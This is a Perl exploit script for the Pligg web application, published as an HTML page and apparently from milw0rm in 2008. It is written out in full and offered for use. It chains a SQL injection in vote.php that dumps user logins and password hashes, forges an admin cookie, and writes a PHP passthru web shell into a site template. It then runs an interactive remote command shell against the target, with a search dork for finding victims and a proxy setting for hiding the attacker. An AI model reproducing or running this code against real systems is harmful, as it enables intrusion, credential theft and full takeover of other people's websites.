<html><head><title>Pligg <= 9.9.0 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl -w
use LWP::UserAgent;
use MIME::Base64;
use Digest::MD5 qw(md5_hex);
use Getopt::Std; getopts('h:', \%args);

print &quot;#############################################\n&quot;;
print &quot;# Pligg &lt;= 9.9 Remote Code Execution Exploit \n&quot;;
print &quot;#############################################\n&quot;;
#dork = &quot;Powered By Pligg&quot; + &quot;Legal: License and Source&quot;

# Proxy address
$ENV{http_proxy} = 'http://127.0.0.1:8118/';

my $http = LWP::UserAgent-&gt;new;
   $http-&gt;agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1');
   #$http-&gt;env_proxy(); # &lt;-- uncomment for proxy
   $http-&gt;cookie_jar({});

my $host = $args{'h'} || usage(); # Host flag. Specify the Pligg root directory
my $user = undef;
my $pass = undef;
my $file = undef;
my $data = undef;
my @auth = undef;

# Details for the php code that is injected in to the template
my $ereg = '&lt;cmdout&gt;(.*?)&lt;\/cmdout&gt;';
my $cvar = 'cmd';
my $cval = 'pwd;id';
my $code = '&lt;cmdout&gt;&lt;?php if ( !empty($_REQUEST[&quot;' . $cvar . '&quot;]) ) passthru($_REQUEST[&quot;' . $cvar . '&quot;]); ?&gt;&lt;/cmdout&gt;';

print &quot;[*] Checking if a shell already exists ...\n&quot;;

$data = $http-&gt;post(
$host . '/index.php',
[
   $cvar  =&gt; $cval
]); 

if ( $data-&gt;content =~ /$ereg/si ) 
{
	print &quot;[*] Found existing shell ...\n&quot;;
}
else
{
	print &quot;[!] No existing shell found ...\n&quot;;

	#############################################
	# Gather user info via vote.php SQL Injection
	#############################################

	$data = $http-&gt;post(
	$host . '/vote.php',
	[
	   'id'  =&gt; '-99 UNION SELECT 1,2,3,null,5,6,concat(user_login,char(58),user_pass),8,9 FROM pligg_users -- /*',
	   'md5' =&gt; 'd41d8cd98f00b204e9800998ecf8427e' # &lt;-- If you aren't logged in this always works
	]); 

	print &quot;[*] Gathering user information ...\n&quot;;
		
	if ( $data-&gt;content =~ /(.*?):([a-f0-9]{1,64})/i )
	{
		$user = $1;
		$pass = $2;

		# Sets up the cookie to authenticate us
		@auth = ('Cookie' =&gt; 'mnm_user=' . $user . '; mnm_key=' . encode_base64($user . ':' . crypt($user, 22) . ':' . md5_hex($pass)) . ';');

		print &quot;[+] Got user '$user' ...\n&quot;;

	}
	else
	{
		print &quot;[!] Unable to get user info. Dumping output ...\n&quot;;
		open(ELOG, '&gt;pligg_debug.html');print ELOG $data-&gt;content;close(ELOG);
		exit;
	}

	#############################################
	# Get the template path
	#############################################

	print &quot;[*] Gathering template information ...\n&quot;;

	$data = $http-&gt;get($host . '/admin_editor.php',@auth); 

	if ( $data-&gt;content =~ /&gt;(.*?)&lt;\/option&gt;/i ) 
	{
		$file = $1;
		# Quick and dirty fix
		$file =~ s/admin_templates\/admin_access_denied.tpl/footer.tpl/;
		print &quot;[+] Got template file [$file]...\n&quot;;
	}

	#############################################
	# Read the template contents
	#############################################

	$data = $http-&gt;post(
	$host . '/admin_editor.php',
	[
	   'the_file'  =&gt; $file,
	   'open' =&gt; 'Open'
	]
	,@auth); 

	print &quot;[*] Reading template data ...\n&quot;;

	# Grab the template contents	
	if ( $data-&gt;content =~ /&lt;textarea(.*)&gt;(.*)&lt;\/textarea&gt;/is )
	{
		$temp = $2;
		$temp =~ s/&amp;gt;/&gt;/ig;
		$temp =~ s/&amp;lt;/&lt;/ig;
		$temp =~ s/&amp;quot;/&quot;/ig;
		$temp =~ s/&amp;amp;/&amp;/ig;

		print &quot;[+] Got template data ...\n&quot;;
	}
	else
	{
		print &quot;[!] Unable to get template data. Dumping output ...\n&quot;;
		open(ELOG, '&gt;pligg_debug.html');print ELOG $data-&gt;content;close(ELOG);
		exit;
	}

	#############################################
	# Update the Template Contents
	#############################################


	$data = $http-&gt;post(
	$host . '/admin_editor.php',
	[
	   'the_file2'   =&gt; $file,
	   'updatedfile' =&gt; $temp . $code,
	   'save'        =&gt; 'Save+Changes'
	]
	,@auth); 

	print &quot;[*] Updating template data ...\n&quot;;

	if ( $data-&gt;content =~ /File Saved/is )
	{
		print &quot;[+] File saved!\n&quot;;
	}
	else
	{
		print &quot;[!] Unable to update template data. Dumping output ...\n&quot;;
		open(ELOG, '&gt;pligg_debug.html');print ELOG $data-&gt;content;close(ELOG);
		exit;
	}
}

#############################################
# Setting up the php shell
#############################################

print &quot;[*] Setting up shell ...\n&quot;;

$data = $http-&gt;post(
$host . '/index.php',
[
   $cvar  =&gt; $cval
]); 

if ( $data-&gt;content =~ /&lt;cmdout&gt;(.*?)&lt;\/cmdout&gt;/si ) 
{
	while ( 1 )
	{
		print &quot;pligg:~#&quot;;
		$exec = &lt;STDIN&gt;;

		$data = $http-&gt;post(
		$host . '/index.php',
		[
		   $cvar  =&gt; $exec
		]); 

		if ( $data-&gt;content =~ /$ereg/si ) 
		{
			print $1 . &quot;\n&quot;;
		}
		else
		{
			print &quot;Unexpected Response!\n&quot;;
		}
	}
}
else
{
	print &quot;[!] Unable to set up shell ...\n&quot;;
	open(ELOG, '&gt;pligg_debug.html');print ELOG $data-&gt;content;close(ELOG);
	exit;
}

sub usage
{
	print &quot;pligg_exploit.pl -h http://path/to/pligg     \n&quot;;
	exit;
}

# milw0rm.com [2008-07-30]</pre></html>